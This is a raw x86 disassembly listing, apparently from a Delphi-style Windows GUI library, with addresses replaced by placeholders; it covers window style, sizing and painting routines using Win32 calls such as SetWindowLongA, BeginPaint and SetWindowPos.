xor eax eax
jmp r-xdata
cmp al [ ebx + 0x258 ]
je r-xdata
sub_3ac6b64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab7da0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x290 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_3ac6bec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_3ab8234
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_3a83ca4
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_3a83c78
mov edi eax
mov eax edi
mov si 0xfff1
call sub_3a6457c
test al al
jne r-xdata
sub_3ac6c58
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_3a64258
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3ac6c9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebp
call sub_3ab3ba4
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_3a83ca4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_3ab827c
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_3a83c78
mov si 0xfff1
call sub_3a6457c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_3a83cb4
jmp r-xdata
sub_3ac6d30
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_3aafda0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_3ab0e78
sub_3ac6d58
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_3aaf514
pop ebx
retn
mov [ ebx + 0x2b0 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_3ac6d8c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_3aaf558
pop ebx
retn
mov [ ebx + 0x2b4 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_3ac6dc0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x358 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_3aafaa8
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x358 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x358 ] 0x2
jmp r-xdata
mov eax esi
call sub_3ac8740
pop esi
pop ebx
retn
sub_3ac6e04
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_3ac6e63
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x277 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac6e6a
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
sub_3ac6e74
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
cmp ebx eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
je r-xdata
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3ac6f24
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ab9120
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab91e8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab472c
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab9120
sub_3ac6f30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_3a83aec
cmp [ ebx + 0x298 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_3ac6f70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x112
jg r-xdata
add edx 0xfffffce2
sub edx 0x2
jb r-xdata
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ad0e24
jmp r-xdata
sub edx 0xacfa
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf120
je r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab4d0c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
dec edx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab4d0c
mov eax [ rw-data ]
call sub_3ad1248
jmp r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf030
sete al
and al [ rw-data ]
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_3a6457c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
sub edx 0x2c
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_3a6457c
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor edi edi
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
call sub_3ad1240
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
sub edx 0x1a
je r-xdata
test esi esi
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_3aa7b18
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac7e40
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ac730f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ac72f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_3a8a3c8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_3a8a25c
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_3aa92a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac72f9
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a8a3c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_3aa7b18
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
dec eax
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax edi
call sub_3ac463c
mov esi eax
mov eax [ ebp - 0x4 ]
cmp edi [ eax + 0x268 ]
jne r-xdata
mov eax esi
call sub_3aac5e0
mov edi eax
push esi
call GetParent
mov esi eax
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ac7e40
call sub_3ab7c38
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_3ac743d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_3ac7416
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3ac73f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_3a8a3c8
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_3a8a25c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ac7400
xor edx edx
mov eax [ ebp - 0xc ]
call sub_3a8a3c8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x278 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x273 ] 0x2
je r-xdata
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp edi [ eax + 0x64 ]
je r-xdata
push esi
call SetFocus
jmp r-xdata
call sub_3ab7c38
mov esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x271 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
cmp esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
mov eax [ esi + 0x268 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp esi [ eax + 0x68 ]
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
jmp r-xdata
cmp edi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x8
call sub_3ab0e78
sub_3ac741d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call ReleaseDC
retn
sub_3ac74d8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_3ac7524
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_3ac7e74
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_3ac7ec0
cmp [ eax + 0x273 ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_3ac7564
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_3ac7732
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_3a89b74
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ab5368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_3aaf6c0
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_3aae18c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
push ebp
call sub_3ac74d8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1a4 ]
call sub_3a89b74
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_3ac7e74
test eax eax
je r-xdata
push ebp
call sub_3ac74d8
pop ecx
push ebp
call sub_3ac74d8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_3ac7524
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
call sub_3ac4034
jmp r-xdata
sub_3ac7744
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_3ac5370
mov eax [ ebx + 0x29c ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x29c ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x29c ]
push eax
call InvalidateRect
sub_3ac77b0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_3ac5a30
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3a83ca4
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_3ab3cc8
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_3a83c78
call sub_3aa88d0
mov edx esi
mov eax ebx
call sub_3a83c78
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ac7848
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28c ] 0x0
jne r-xdata
pop esi
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x1
xor eax eax
push ebp
push sub_3ac78c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28c ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
jne r-xdata
movzx edx [ esi + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ rw-data ]
movzx edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_3ac78d4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3aac5e0
test eax eax
je r-xdata
mov eax [ ebx + 0x33c ]
call sub_3a66414
mov edi eax
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0x33c ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x4 ]
mov edx [ edx ]
mov [ eax + edi * 8 ] edx
mov eax [ ebx + 0x33c ]
mov edx [ esi + 0x8 ]
mov [ eax + edi * 8 + 0x4 ] edx
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_3ac793c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
and [ edi ] 0xfff4ffff
and [ ebp ] 0xfffffbff
movzx eax [ esi + 0x271 ]
mov [ esp ] al
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ebx [ esi + 0x270 ]
movzx eax [ esp ]
sub al 0x1
jb r-xdata
movzx eax [ esp ]
test al al
je r-xdata
movzx ebx [ r-xdata ]
jmp r-xdata
sub al 0x2
je r-xdata
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
movzx eax [ esp ]
sub al 0x3
jae r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
test bl 0x1
je r-xdata
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx eax [ r-xdata ]
and al bl
mov ebx eax
jmp r-xdata
test bl 0x8
je r-xdata
or [ edi ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
or [ ebp ] 0x400
test bl 0x4
je r-xdata
or [ edi ] 0x20000
or [ edi ] 0x10000
sub_3ac7a05
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff4
mov [ esp ] dl
mov ebx eax
movzx eax [ esp ]
cmp al [ ebx + 0x270 ]
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
movzx eax [ esp ]
mov [ ebx + 0x270 ] al
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
mov [ esp + 0x8 ] eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax ebx
mov si 0xffaa
call sub_3a6457c
mov eax [ esp + 0x4 ]
push eax
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
jmp r-xdata
cmp [ ebx + 0x273 ] 0x2
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_3ab4518
sub_3ac7af0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
and [ edx ] 0x7f3bff7f
and [ edi ] 0xfffffe7e
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffd7ff
movzx eax [ esi + 0x271 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
movzx ecx al
cmp ecx 0x5
ja r-xdata
mov ecx eax
test cl cl
je r-xdata
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ ecx * 4 + jump_table_3ac7b3e ]
mov al 0x2
sub cl 0x3
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x277 ] 0x1
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
or [ edx ] 0xc00000
jmp r-xdata
or [ edx ] 0xc40000
jmp r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
or [ edi ] 0x80
cmp [ esi + 0x1c4 ] 0x0
jne r-xdata
mov ecx [ edx ]
or ecx 0x80000000
or ecx 0xc00000
mov [ edx ] ecx
cmp [ esi + 0x30 ] 0x0
je r-xdata
or [ edx ] 0x80000000
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
or edx 0x8
or edx 0x800
or edx 0x2000
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ edx ]
or ecx 0x400000
or ecx 0x80
mov [ edx ] ecx
or [ edx ] 0xc00000
jmp r-xdata
mov ecx [ edi ]
or ecx 0x1
or ecx 0x100
mov [ edi ] ecx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
jne r-xdata
sub_3ac7c04
push esi
push edi
add esp 0xfffffff4
mov edi eax
cmp dl [ edi + 0x271 ]
je r-xdata
add esp 0xc
pop edi
pop esi
retn
mov [ edi + 0x271 ] dl
cmp [ edi + 0x258 ] 0x0
je r-xdata
xor edx edx
jmp r-xdata
movzx eax [ edi + 0x271 ]
sub al 0x2
je r-xdata
mov eax edi
call sub_3ac54ec
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0xfffffff0
mov eax edi
call sub_3ab7c38
push eax
call GetWindowLongA
mov [ esp ] eax
push 0xffffffec
mov eax edi
call sub_3ab7c38
push eax
call GetWindowLongA
mov [ esp + 0x4 ] eax
push 0xffffffe6
mov eax edi
call sub_3ab7c38
push eax
call GetClassLongA
mov [ esp + 0x8 ] eax
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0x4 ]
mov eax edi
mov si 0xffa9
call sub_3a6457c
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax edi
mov si 0xffaa
call sub_3a6457c
mov eax [ esp ]
push eax
push 0xfffffff0
mov eax edi
call sub_3ab7c38
push eax
call SetWindowLongA
mov eax [ esp + 0x4 ]
push eax
push 0xffffffec
mov eax edi
call sub_3ab7c38
push eax
call SetWindowLongA
mov eax [ esp + 0x8 ]
push eax
push 0xffffffe6
mov eax edi
call sub_3ab7c38
push eax
call SetClassLongA
mov eax edi
call sub_3ab7fd8
test al al
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax edi
call sub_3ab7c38
push eax
call SetWindowPos
mov eax edi
